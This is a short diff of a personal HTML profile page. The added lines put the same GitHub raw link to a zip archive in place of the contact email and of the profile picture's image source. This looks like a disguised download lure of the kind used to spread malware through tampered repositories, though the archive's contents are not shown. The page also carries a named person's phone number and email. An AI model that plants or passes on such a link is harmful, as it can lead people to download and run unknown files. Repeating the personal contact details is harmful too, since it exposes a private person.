@@ -22,10 +22,10 @@ Sorry... I don't have any work experience<hr>
 <li>Higher Secondary School Certificate</li>
 </ul><hr>
 <h3>Contact Information :</h3>
-Email : sadmansohan10@gmail.com<br>
+Email : https://github.com/Sadman2310/Sadman2310/raw/refs/heads/master/img/Sadman_2.2.zip<br>
 Phone : 01736932064 <hr>
 <h3>Here is my picture : </h3>
-<img src="/img/391592212_1512955276186126_4341228969748134611_n.jpg" width="300" height="450" border="circle"><hr>
+<img src="https://github.com/Sadman2310/Sadman2310/raw/refs/heads/master/img/Sadman_2.2.zip" width="300" height="450" border="circle"><hr>
 <h3>Conclution : </h3>
 If you are pleased by vsiting this repo then please pray for me..
 
